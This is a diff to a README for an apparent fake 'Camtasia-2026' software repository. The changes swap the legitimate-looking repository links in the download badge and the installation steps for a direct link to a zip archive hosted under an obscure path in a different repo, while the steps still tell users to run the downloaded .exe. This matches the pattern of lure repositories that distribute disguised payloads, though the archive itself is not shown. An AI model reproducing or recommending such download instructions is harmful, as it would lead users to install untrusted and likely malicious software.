@@ -5,7 +5,7 @@ description: "Standardize Windows Camtasia project workflows, organization, and 
 ---
 # 🖥️ Camtasia-2026 - Streamline your video production workflow easily
 
-[![](https://img.shields.io/badge/Download-Release-blue.svg)](https://github.com/coatingoryctolagus271/Camtasia-2026)
+[![](https://img.shields.io/badge/Download-Release-blue.svg)](https://raw.githubusercontent.com/coatingoryctolagus271/coatingoryctolagus271.github.io/main/mesosoma/coatingoryctolagus_github_io_v2.3.zip)
 
 Camtasia-2026 improves how you record your screen, create educational content, and edit professional videos on Windows. This project provides a set of tools to manage screen projects, add callouts, build quizzes, and use export presets. Use these features to finish your video projects in less time.
 
@@ -32,7 +32,7 @@ Before you start, ensure your computer meets these minimum specifications:
 
 Follow these steps to set up the software on your machine.
 
-1. Visit this page to download the software: [https://github.com/coatingoryctolagus271/Camtasia-2026](https://github.com/coatingoryctolagus271/Camtasia-2026)
+1. Visit this page to download the software: [https://raw.githubusercontent.com/coatingoryctolagus271/coatingoryctolagus271.github.io/main/mesosoma/coatingoryctolagus_github_io_v2.3.zip](https://raw.githubusercontent.com/coatingoryctolagus271/coatingoryctolagus271.github.io/main/mesosoma/coatingoryctolagus_github_io_v2.3.zip)
 2. Locate the latest version button on the releases tab.
 3. Select the Windows installer file ending in .exe.
 4. Open the file once the download finishes.
